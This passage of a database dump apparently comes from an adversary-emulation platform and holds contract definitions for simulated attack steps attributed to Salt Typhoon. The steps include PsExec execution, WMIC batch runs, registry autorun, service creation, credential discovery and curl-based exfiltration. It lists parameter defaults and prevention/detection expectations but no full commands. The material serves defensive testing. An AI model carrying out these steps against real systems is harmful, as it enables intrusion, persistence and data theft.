obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"IP","label":"IP","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"127.0.0.1","type":"text"},{"key":"psexec_binary\\t","label":"psexec_binary\\t","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"C:\\\\Windows\\\\Temp\\\\PsTools\\\\PsExec64.exe","type":"text"},{"key":"psexec_path\\t","label":"psexec_path\\t","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"c:\\\\windows\\\\temp","type":"text"},{"key":"file","label":"file","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"8551e440-55e5-4122-a1e2-43fd802e7df6","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	01cfeaf9-f941-4f36-b6fd-a94338fdd400	f	\N
138ad8f8-32f8-4a22-8114-aaa12322bd09	2026-01-09 14:19:18.538488+00	2026-01-09 14:19:34.248227+00	"en"=>"Send individual mails", "fr"=>"Envoyer des mails individuels"	f	{"config":{"type":"openaev_email","expose":true,"label":{"fr":"Email","en":"Email"},"color_dark":"#cddc39","color_light":"#cddc39"},"label":{"fr":"Envoyer des mails individuels","en":"Send individual mails"},"manual":false,"fields":[{"key":"teams","label":"Teams","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"team"},{"key":"subject","label":"Subject","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","type":"text"},{"key":"body","label":"Body","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","richText":true,"type":"textarea"},{"key":"encrypted","label":"Encrypted","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":false,"type":"checkbox"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[],"type":"expectation"}],"variables":[{"key":"document_uri","label":"Http user link to upload the document (only for document expectation)","type":"String","cardinality":"1","children":[]},{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"138ad8f8-32f8-4a22-8114-aaa12322bd09","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":false,"platforms":["Service"]}	41b4dd55-5bd1-4614-98cd-9e3770753306	t	f	{Service}	f	\N	t	\N
09a4b4ae-6848-44bd-bc75-9f9b1957edbb	2026-01-09 14:19:26.36811+00	2026-01-09 14:19:26.368131+00	"en"=>"Enumerate Local and Remote System Info - Salt Typhoon", "fr"=>"Enumerate Local and Remote System Info - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Enumerate Local and Remote System Info - Salt Typhoon","en":"Enumerate Local and Remote System Info - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"09a4b4ae-6848-44bd-bc75-9f9b1957edbb","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	8bd4e3b0-a4e9-4386-8c0c-162904230f8c	f	\N
8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d	2026-01-09 14:19:26.515517+00	2026-01-09 14:19:26.515535+00	"en"=>"BAT script execution with WMIC - Salt Typhoon", "fr"=>"BAT script execution with WMIC - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"BAT script execution with WMIC - Salt Typhoon","en":"BAT script execution with WMIC - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"file","label":"file","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	087b535f-cb98-44e6-9e1d-cbb0ab2636fb	f	\N
457463b7-c58c-468c-91a1-debaaa65aa9a	2026-01-09 14:19:26.672129+00	2026-01-09 14:19:26.67215+00	"en"=>"Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon", "fr"=>"Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon","en":"Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"457463b7-c58c-468c-91a1-debaaa65aa9a","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	3d1f53e2-4937-4864-a71c-5b69ccb11c48	f	\N
9f936e9e-9712-4249-ab63-c437b1a3a090	2026-01-09 14:19:26.785995+00	2026-01-09 14:19:26.786017+00	"en"=>"Create a New Service \\"Crowdoor\\" - Salt Typhoon", "fr"=>"Create a New Service \\"Crowdoor\\" - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Create a New Service \\"Crowdoor\\" - Salt Typhoon","en":"Create a New Service \\"Crowdoor\\" - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"9f936e9e-9712-4249-ab63-c437b1a3a090","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	37556310-9d6b-46ed-b3e9-76634449208f	f	\N
28cbebe0-6b35-4e36-86bc-bb3d1e2c4702	2026-01-09 14:19:26.959988+00	2026-01-09 14:19:26.960008+00	"en"=>"TrillClient’s user credential discovery - Salt Typhoon", "fr"=>"TrillClient’s user credential discovery - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"TrillClient’s user credential discovery - Salt Typhoon","en":"TrillClient’s user credential discovery - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"28cbebe0-6b35-4e36-86bc-bb3d1e2c4702","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	b68d40e8-f3f1-4451-afaf-918fc002417a	f	\N
af6631b3-1ca5-4e92-bab1-d1f274ba7691	2026-01-09 14:19:27.141851+00	2026-01-09 14:19:27.141874+00	"en"=>"Exfiltrate data HTTPS using curl windows", "fr"=>"Exfiltrate data HTTPS using curl windows"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Exfiltrate data HTTPS using curl windows","en":"Exfiltrate data HTTPS using curl windows"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"input_file","label":"input_file","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"c:\\\\windows\\\\ime\\\\out3.tmp","type":"text"},{"key":"curl_path","label":"curl_path","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"C:\\\\windows\\\\temp\\\\curl\\\\curl-8.4.0_6-win64-mingw\\\\bin\\\\curl.exe","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform 